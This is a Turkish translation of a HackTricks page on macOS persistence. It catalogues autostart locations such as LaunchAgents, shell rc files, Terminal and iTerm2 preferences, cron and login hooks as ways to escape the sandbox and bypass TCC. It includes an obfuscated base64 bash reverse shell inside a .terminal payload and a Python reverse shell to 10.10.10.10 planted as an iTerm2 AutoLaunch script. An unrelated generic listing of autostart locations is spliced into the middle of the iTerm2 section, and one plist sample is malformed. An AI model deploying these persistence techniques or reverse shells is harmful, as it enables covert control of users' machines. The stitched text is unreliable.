# macOS Otomatik Başlatma

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

Bu bölüm, [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog serisine dayanmaktadır. Amacı, **daha fazla Otomatik Başlatma Konumu** (mümkünse) eklemek, günümüzdeki macOS'ın en son sürümü (13.4) ile hala çalışan **hangi teknikleri belirtmek** ve **gereken izinleri** belirtmektir.

## Sandbox Atlama

{% hint style="success" %}
Burada, **sandbox atlama** için kullanışlı olan başlatma konumlarını bulabilirsiniz. Bu, bir şeyi **bir dosyaya yazarak** ve çok **yaygın bir eylem**, belirli bir **zaman miktarı** veya genellikle bir sandbox içinden root izinleri olmadan gerçekleştirebileceğiniz bir **eylem** bekleyerek basitçe **yürütmenizi sağlar**.
{% endhint %}

### Launchd

* Sandbox atlama için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC Atlama: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

* **`/Library/LaunchAgents`**
* **Tetikleyici**: Yeniden başlatma
* Root gerektirir
* **`/Library/LaunchDaemons`**
* **Tetikleyici**: Yeniden başlatma
* Root gerektirir
* **`/System/Library/LaunchAgents`**
* **Tetikleyici**: Yeniden başlatma
* Root gerektirir
* **`/System/Library/LaunchDaemons`**
* **Tetikleyici**: Yeniden başlatma
* Root gerektirir
* **`~/Library/LaunchAgents`**
* **Tetikleyici**: Yeniden oturum açma
* **`~/Library/LaunchDemons`**
* **Tetikleyici**: Yeniden oturum açma

#### Açıklama ve Sömürü

**`launchd`**, OX S çekirdeği tarafından başlatılan **ilk** **işlem** ve kapanışta biten son işlemdir. Her zaman **PID 1**'e sahip olmalıdır. Bu işlem, yönetici tarafından yüklenen **ASEP** **plistlerinde** belirtilen yapılandırmaları **okur ve yürütür**:

* `/Library/LaunchAgents`: Yönetici tarafından yüklenen kullanıcı başlatıcıları
* `/Library/LaunchDaemons`: Yönetici tarafından yüklenen sistem genelindeki hizmetler
* `/System/Library/LaunchAgents`: Apple tarafından sağlanan kullanıcı başlatıcıları.
* `/System/Library/LaunchDaemons`: Apple tarafından sağlanan sistem genelindeki hizmetler.

Bir kullanıcı oturum açtığında, `/Users/$USER/Library/LaunchAgents` ve `/Users/$USER/Library/LaunchDemons` konumunda bulunan plistler, **oturum açan kullanıcının izinleriyle** başlatılır.

**Ajanlar ve hizmetler arasındaki temel fark, ajanların kullanıcı oturum açtığında yüklenmesi ve hizmetlerin sistem başlangıcında yüklenmesidir** (çünkü ssh gibi hizmetlerin sisteme erişmeden önce çalıştırılması gerekmektedir). Ayrıca ajanlar GUI kullanabilirken, hizmetler arka planda çalışması gerekmektedir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Bazı durumlarda, kullanıcı oturum açmadan önce bir **ajanın çalıştırılması gerekebilir**, bunlara **PreLoginAgents** denir. Örneğin, bu, oturum açma sırasında destekleyici teknoloji sağlamak için kullanışlıdır. Bunlar ayrıca `/Library/LaunchAgents` dizininde de bulunabilir (bir örnek için [**buraya**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) bakın).

{% hint style="info" %}
Yeni Daemon veya Ajan yapılandırma dosyaları, **bir sonraki yeniden başlatma veya** `launchctl load <hedef.plist>` **kullanılarak yüklenecektir**. Ayrıca, `.plist` uzantısı olmadan `launchctl -F <dosya>` ile **plist dosyalarının yüklenmesi de mümkündür** (ancak bu plist dosyaları otomatik olarak yeniden başlatıldıktan sonra yüklenmeyecektir).\
`launchctl unload <hedef.plist>` ile de **boşaltma** yapılabilir (onu işaret eden işlem sonlandırılacaktır).

Bir **Ajanın** veya **Daemonun** çalışmasını **engelleyen** (geçersiz kılan gibi) **herhangi bir şeyin olmadığından emin olmak** için şunu çalıştırın: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Mevcut kullanıcı tarafından yüklenen tüm ajanları ve daemonları listele:
```bash
launchctl list
```
{% hint style="warning" %}
Eğer bir plist kullanıcının sahip olduğuysa, hatta daemon sistem genelindeki klasörlerde olsa bile, **görev kullanıcı olarak** ve root olarak değil çalıştırılır. Bu bazı ayrıcalık yükseltme saldırılarını engelleyebilir.
{% endhint %}

### kabuk başlangıç dosyaları

Yazı: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Yazı (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Sandbox'ı atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC Atlatma: [✅](https://emojipedia.org/check-mark-button)
* Ancak, bu dosyaları yükleyen bir kabuk çalıştıran bir TCC atlatması olan bir uygulama bulmanız gerekmektedir.

#### Konumlar

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Tetikleyici**: zsh ile bir terminal açın
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Tetikleyici**: zsh ile bir terminal açın
* Root gerektirir
* **`~/.zlogout`**
* **Tetikleyici**: zsh ile bir terminalden çıkın
* **`/etc/zlogout`**
* **Tetikleyici**: zsh ile bir terminalden çıkın
* Root gerektirir
* Olası olarak daha fazlası: **`man zsh`**
* **`~/.bashrc`**
* **Tetikleyici**: bash ile bir terminal açın
* `/etc/profile` (çalışmadı)
* `~/.profile` (çalışmadı)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Tetikleyici**: xterm ile tetiklenmesi beklenir, ancak **kurulu değil** ve kurulduktan sonra bile bu hata alınır: xterm: `DISPLAY is not set`

#### Açıklama ve Sömürü

`zsh` veya `bash` gibi bir kabuk ortamı başlatıldığında, **belirli başlangıç dosyaları çalıştırılır**. macOS şu anda varsayılan kabuk olarak `/bin/zsh` kullanmaktadır. Bu kabuk, Terminal uygulaması başlatıldığında veya bir cihaz SSH üzerinden erişildiğinde otomatik olarak erişilir. `bash` ve `sh` de macOS'ta bulunmasına rağmen, kullanılmak için açıkça çağrılması gerekmektedir.

`man zsh` ile okuyabileceğimiz zsh'in man sayfası, başlangıç dosyalarının uzun bir açıklamasını içerir.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Yeniden Açılan Uygulamalar

{% hint style="danger" %}
Belirtilen saldırıyı yapılandırmak ve oturumu kapatıp açmak veya hatta yeniden başlatmak, uygulamayı çalıştırmam için işe yaramadı. (Uygulama çalıştırılmıyordu, belki de bu işlemler gerçekleştirilirken uygulama çalışır durumda olmalı)
{% endhint %}

**Yazı**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Sandbox'ı atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlaması: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Tetikleyici**: Uygulamaları yeniden açma işlemi

#### Açıklama ve Saldırı

Yeniden açılacak tüm uygulamalar `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` plist dosyasının içindedir.

Bu nedenle, kendi uygulamanızı yeniden açılacak uygulamalar listesine eklemek için sadece **uygulamanızı listeye eklemeniz gerekir**.

UUID, bu dizini listelemek veya `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` komutunu kullanarak bulunabilir.

Yeniden açılacak uygulamaları kontrol etmek için şunu yapabilirsiniz:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Bu listeye bir uygulama eklemek için şunları kullanabilirsiniz:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Tercihleri

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlaması: [✅](https://emojipedia.org/check-mark-button)
* Terminal, kullanıcının FDA izinlerine sahip olmasını gerektirir.

#### Konum

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Tetikleyici**: Terminal Aç

#### Açıklama ve Sömürü

**`~/Library/Preferences`** içinde, Kullanıcı Tercihleri uygulamaların tercihlerini saklar. Bu tercihlerin bazıları, **diğer uygulamaları / komut dosyalarını çalıştırmak** için bir yapılandırmayı tutabilir.

Örneğin, Terminal Başlangıcında bir komut çalıştırabilir:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Bu yapılandırma, **`~/Library/Preferences/com.apple.Terminal.plist`** dosyasında şu şekilde yansıtılır:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Eğer sistemdeki terminalin tercihlerinin plist'i üzerine yazılabilirse, **`open`** işlevi kullanılarak terminal açılabilir ve bu komut çalıştırılır.

Bunu aşağıdaki komutla CLI'dan ekleyebilirsiniz:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminal Komut Dosyaları / Diğer dosya uzantıları

* Sandbox'ı atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* Terminal, kullanıcının FDA izinlerine sahipse kullanılabilir

#### Konum

* **Herhangi bir yer**
* **Tetikleyici**: Terminal Aç

#### Açıklama ve Sömürü

Eğer bir [**`.terminal`** komut dosyası](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) oluşturup açarsanız, **Terminal uygulaması** otomatik olarak çağrılır ve içinde belirtilen komutları çalıştırır. Eğer Terminal uygulamasının özel yetkileri varsa (örneğin TCC gibi), komutunuz bu özel yetkilerle çalıştırılır.

Denemek için:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Ayrıca **`.command`**, **`.tool`** uzantılarını da kullanabilirsiniz, bunlar düzenli kabuk komutları içeren betiklerdir ve Terminal tarafından da açılırlar.

{% hint style="danger" %}
Terminalin **Tam Disk Erişimi** varsa, bu işlemi tamamlayabilir (dikkat: yürütülen komut bir terminal penceresinde görünecektir).
{% endhint %}

### Ses Eklentileri

Yazı: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Yazı: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlaması: [🟠](https://emojipedia.org/large-orange-circle)
* Ekstra TCC erişimi elde edebilirsiniz

#### Konum

* **`/Library/Audio/Plug-Ins/HAL`**
* Root gereklidir
* **Tetikleme**: coreaudiod veya bilgisayarı yeniden başlatın
* **`/Library/Audio/Plug-ins/Components`**
* Root gereklidir
* **Tetikleme**: coreaudiod veya bilgisayarı yeniden başlatın
* **`~/Library/Audio/Plug-ins/Components`**
* **Tetikleme**: coreaudiod veya bilgisayarı yeniden başlatın
* **`/System/Library/Components`**
* Root gereklidir
* **Tetikleme**: coreaudiod veya bilgisayarı yeniden başlatın

#### Açıklama

Önceki yazılara göre, bazı ses eklentilerini derleyip yüklemek mümkündür.

### QuickLook Eklentileri

Yazı: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlaması: [🟠](https://emojipedia.org/large-orange-circle)
* Ekstra TCC erişimi elde edebilirsiniz

#### Konum

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Açıklama ve Sömürü

QuickLook eklentileri, bir dosyanın önizlemesini tetiklediğinizde (Finder'da dosya seçiliyken boşluk çubuğuna basın) ve o dosya türünü destekleyen bir eklenti yüklü olduğunda çalıştırılabilir.

Kendi QuickLook eklentinizi derleyebilir, onu önceki konumlardan birine yerleştirebilir ve ardından desteklenen bir dosyaya gidip tetiklemek için boşluk tuşuna basabilirsiniz.

### ~~Giriş/Çıkış Kancaları~~

{% hint style="danger" %}
Bu benim için çalışmadı, ne kullanıcı GirişKancağı ne de root ÇıkışKancağı ile.
{% endhint %}

**Yazı**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlaması: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` gibi bir şeyi yürütebilmek için yetenekli olmanız gerekiyor
* `~/Library/Preferences/com.apple.loginwindow.plist` konumunda bulunur

Bu kullanımdan kaldırılmış olsa da, bir kullanıcı oturum açtığında komutları yürütmek için kullanılabilir.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Bu ayar `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` dosyasında saklanır.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Silmek için:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Root kullanıcısı biri **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** içinde saklanır.

## Koşullu Sandbox Atlatma

{% hint style="success" %}
Burada, **sandbox atlatma** için kullanışlı olan başlangıç konumlarını bulabilirsiniz. Bu, bir şeyi **bir dosyaya yazarak** ve belirli **programların yüklü olması, "sıradışı" kullanıcı** eylemleri veya ortamlar gibi **çok yaygın olmayan koşulların** oluşmasını beklemek suretiyle basitçe bir şeyi yürütmenizi sağlar.
{% endhint %}

### Cron

**Yazı**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Sandbox atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Bununla birlikte, `crontab` ikilisini yürütebilmek veya root olmanız gerekmektedir.
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Doğrudan yazma erişimi için root gereklidir. `crontab <dosya>` komutunu yürütebiliyorsanız root gerekmez.
* **Tetikleyici**: Cron görevine bağlıdır.

#### Açıklama ve Sömürü

**Mevcut kullanıcının** cron görevlerini listelemek için:
```bash
crontab -l
```
Kullanıcıların tüm cron işlerini **`/usr/lib/cron/tabs/`** ve **`/var/at/tabs/`** (root gerektirir) dizinlerinde görebilirsiniz.

MacOS'ta belirli bir sıklıkla betikleri çalıştıran birkaç klasör bulunabilir:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Aşağıda düzenli **cron** **görevleri**, **at** **görevleri** (pek kullanılmaz) ve **periyodik** **görevler** (genellikle geçici dosyaları temizlemek için kullanılır) bulunabilir. Günlük periyodik görevler örneğin şu şekilde çalıştırılabilir: `periodic daily`.

**Kullanıcıya programatik olarak bir cron görevi eklemek** için şunları kullanabilirsiniz:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Yazı: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* TCC atlaması: [✅](https://emojipedia.org/check-mark-button)
* iTerm2, TCC izinlerine sahip olmuştu

#### Konumlar

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Tetikleyici**: iTerm açıldığında
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Tetikleyici**: iTerm açıldığında
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Tetikleyici**: iTerm açıldığında

#### Açıklama ve Sömürü

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** dizininde depolanan betikler çalıştırılır. Örneğin:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
# macOS Otomatik Başlatma Konumları

Bu bölümde, macOS işletim sisteminde otomatik başlatma konumlarını keşfetmek için kullanılan farklı yöntemleri bulacaksınız. Bu konumlar, kötü niyetli bir saldırganın sisteme erişim sağlamak veya kalıcı bir şekilde etkileşimde bulunmak için kullanabileceği yerlerdir.

## 1. Launchd

Launchd, macOS'ta otomatik başlatma işlemlerini yönetmek için kullanılan bir sistem yöneticisidir. Aşağıdaki komutu kullanarak, Launchd tarafından yönetilen otomatik başlatma öğelerini listeleyebilirsiniz:

```bash
$ launchctl list
```

## 2. LaunchAgents

LaunchAgents, kullanıcı seviyesinde otomatik başlatma öğelerini içeren bir dizindir. Aşağıdaki komutu kullanarak, LaunchAgents dizinindeki otomatik başlatma öğelerini listeleyebilirsiniz:

```bash
$ ls ~/Library/LaunchAgents
```

## 3. LaunchDaemons

LaunchDaemons, sistem seviyesinde otomatik başlatma öğelerini içeren bir dizindir. Aşağıdaki komutu kullanarak, LaunchDaemons dizinindeki otomatik başlatma öğelerini listeleyebilirsiniz:

```bash
$ ls /Library/LaunchDaemons
```

## 4. Startup Items

Startup Items, eski macOS sürümlerinde kullanılan bir otomatik başlatma yöntemidir. Aşağıdaki komutu kullanarak, Startup Items dizinindeki otomatik başlatma öğelerini listeleyebilirsiniz:

```bash
$ ls /Library/StartupItems
```

## 5. Login Items

Login Items, kullanıcı oturumu açıldığında otomatik olarak başlatılan uygulamaları içeren bir özelliktir. Aşağıdaki komutu kullanarak, Login Items listesini görüntüleyebilirsiniz:

```bash
$ osascript -e 'tell application "System Events" to get the name of every login item'
```

## 6. Cron Jobs

Cron Jobs, zamanlanmış görevleri çalıştırmak için kullanılan bir sistem aracıdır. Aşağıdaki komutu kullanarak, kullanıcıya ait cron görevlerini listeleyebilirsiniz:

```bash
$ crontab -l
```

## 7. Spotlight Importer Plugins

Spotlight Importer Plugins, Spotlight arama motoruna özel dosya türlerini tanıtmak için kullanılan eklentilerdir. Aşağıdaki komutu kullanarak, Spotlight Importer Plugins dizinindeki eklentileri listeleyebilirsiniz:

```bash
$ ls /Library/Spotlight
```

## 8. QuickLook Plugins

QuickLook Plugins, Finder'da hızlı bir önizleme sağlamak için kullanılan eklentilerdir. Aşağıdaki komutu kullanarak, QuickLook Plugins dizinindeki eklentileri listeleyebilirsiniz:

```bash
$ ls /Library/QuickLook
```

## 9. Safari Extensions

Safari Extensions, Safari tarayıcısına eklenen özellikleri sağlayan eklentilerdir. Aşağıdaki komutu kullanarak, Safari Extensions dizinindeki eklentileri listeleyebilirsiniz:

```bash
$ ls ~/Library/Safari/Extensions
```

## 10. Login Hooks

Login Hooks, kullanıcı oturumu açıldığında çalıştırılan özel betiklerdir. Aşağıdaki komutu kullanarak, Login Hooks'u kontrol edebilirsiniz:

```bash
$ sudo defaults read com.apple.loginwindow LoginHook
```

## 11. Logout Hooks

Logout Hooks, kullanıcı oturumu kapatıldığında çalıştırılan özel betiklerdir. Aşağıdaki komutu kullanarak, Logout Hooks'u kontrol edebilirsiniz:

```bash
$ sudo defaults read com.apple.loginwindow LogoutHook
```

## 12. Kernel Extensions

Kernel Extensions, macOS çekirdeğine eklenen sürücü veya sistem genişletmeleridir. Aşağıdaki komutu kullanarak, yüklü Kernel Extensions'ları listeleyebilirsiniz:

```bash
$ kextstat | grep -v com.apple
```

## 13. Launchctl Overrides

Launchctl Overrides, Launchd tarafından yönetilen otomatik başlatma öğelerinin geçersiz kılınmasını sağlayan bir mekanizmadır. Aşağıdaki komutu kullanarak, Launchctl Overrides'ları kontrol edebilirsiniz:

```bash
$ sudo launchctl list | grep -v apple
```

## 14. System Preferences

System Preferences, macOS ayarlarını yönetmek için kullanılan bir uygulamadır. Aşağıdaki adımları izleyerek, System Preferences'ta otomatik başlatma öğelerini kontrol edebilirsiniz:

1. System Preferences uygulamasını açın.
2. "Users & Groups" bölümüne gidin.
3. "Login Items" sekmesini seçin.
4. Otomatik başlatma öğelerini listeleyin ve gerektiğinde kaldırın.

## 15. Third-Party Applications

Üçüncü taraf uygulamalar, macOS'ta otomatik başlatma öğelerini ekleyebilir. Bu nedenle, yüklediğiniz uygulamaların otomatik başlatma ayarlarını kontrol etmek önemlidir. Bu ayarlar genellikle uygulama tercihlerinde veya menü çubuğunda bulunur.

---

Bu konumlar, macOS işletim sisteminde otomatik başlatma öğelerini keşfetmek için kullanılan farklı yöntemleri içermektedir. Bu bilgileri kullanarak, sisteminizdeki otomatik başlatma öğelerini kontrol edebilir ve gerektiğinde kaldırabilirsiniz.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Aşağıdaki komut da çalıştırılacak: **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** dosyasında bulunan iTerm2 tercihleri, iTerm2 terminali açıldığında **çalıştırılacak bir komut belirtebilir**.

Bu ayar, iTerm2 ayarlarında yapılandırılabilir:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Ve komut tercihlere yansır:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Komutu yürütmek için aşağıdaki komutu kullanabilirsiniz:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
İTunes tercihlerini kötüye kullanmanın **diğer yolları olabileceği** yüksek olasılıktır.
{% endhint %}

### xbar

Yazı: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak xbar yüklü olmalı
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* Erişilebilirlik izni istiyor

#### Konum

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Tetikleyici**: xbar çalıştırıldığında

#### Açıklama

Eğer popüler program [**xbar**](https://github.com/matryer/xbar) yüklü ise, **`~/Library/Application\ Support/xbar/plugins/`** dizininde bir kabuk komutu yazmak mümkündür. Bu komut xbar başlatıldığında çalıştırılacaktır:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Yazılım İncelemesi**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak Hammerspoon yüklü olmalı
* TCC atlatması: [✅](https://emojipedia.org/check-mark-button)
* Erişilebilirlik izni istiyor

#### Konum

* **`~/.hammerspoon/init.lua`**
* **Tetikleyici**: Hammerspoon çalıştırıldığında

#### Açıklama

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon), işlemleri için **LUA betik dili**ni kullanan bir **macOS** otomasyon platformu olarak hizmet verir. Özellikle, tam AppleScript kodunun entegrasyonunu ve kabuk komutlarının yürütülmesini destekleyerek betikleme yeteneklerini önemli ölçüde artırır.

Uygulama, `~/.hammerspoon/init.lua` adlı tek bir dosyayı arar ve başlatıldığında betik yürütülür.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### SSHRC

Yazım: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak ssh etkinleştirilmeli ve kullanılmalıdır
* TCC atlatma: [✅](https://emojipedia.org/check-mark-button)
* SSH, FDA erişimine sahip olmak için kullanılır

#### Konum

* **`~/.ssh/rc`**
* **Tetikleyici**: ssh ile oturum açma
* **`/etc/ssh/sshrc`**
* Kök erişimi gerektirir
* **Tetikleyici**: ssh ile oturum açma

{% hint style="danger" %}
Ssh'yi açmak için Tam Disk Erişimi gereklidir:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

